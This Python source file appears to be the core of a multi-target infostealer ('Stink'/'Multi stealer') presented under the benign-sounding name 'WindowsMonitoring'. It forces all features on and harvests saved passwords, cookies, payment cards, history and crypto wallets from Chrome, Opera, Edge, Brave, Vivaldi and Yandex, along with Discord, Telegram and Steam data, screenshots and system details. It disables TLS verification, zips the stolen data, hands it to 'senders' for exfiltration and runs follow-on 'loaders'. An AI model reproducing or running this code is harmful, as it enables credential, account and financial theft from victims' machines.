import ssl
from sys import argv
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool

from systoring.windowsmonitoring.enums import Features, Utils, Prtts
from systoring.windowsmonitoring.helpers import functions, MemoryStorage
from systoring.windowsmonitoring.helpers.config import MultistealerConfig, Browsers
from systoring.windowsmonitoring.utils import ASt, Mssg, Prtt, Lfr, Grb
from systoring.windowsmonitoring.modules import Chromium, Dscr, FZ, Processes, Screenshot, System, TE, Steam, WS

class WindowsMonitoring(Thread):
    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        loaders: List[Lfr] = None,
        protectors: List[Prtt] = None,
        grabbers: List[Grb] = None,
        delay: int = 0
    ):
        Thread.__init__(self, name="Windows Monitoring")

        if senders is None:
            senders = []

        if utils is None:
            utils = []

        features = [Features.all]

        self.__senders = senders
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": Features.system in features or Features.all in features
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": Features.processes in features or Features.all in features
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": Features.screenshot in features or Features.all in features
            },
            {
                "object": Dscr,
                "arguments": (
                    "Programs/Discord",
                ),
                "status": Features.discord in features or Features.all in features
            },
            {
                "object": TE,
                "arguments": (
                    "Programs/Telegram",
                ),
                "status": Features.telegram in features or Features.all in features
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": Features.steam in features or Features.all in features
            },
            {
                "object": WS,
                "arguments": (
                    "Wallets",
                ),
                "status": Features.wallets in features or Features.all in features
            }
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)
            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            if self.__grabbers:

                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(functions.run_process, [
                        (grabber, None) for grabber in self.__grabbers
                    ])
                pool.close()

                results += grabber_results

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

            for loader in self.__loaders:
                loader.run()

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")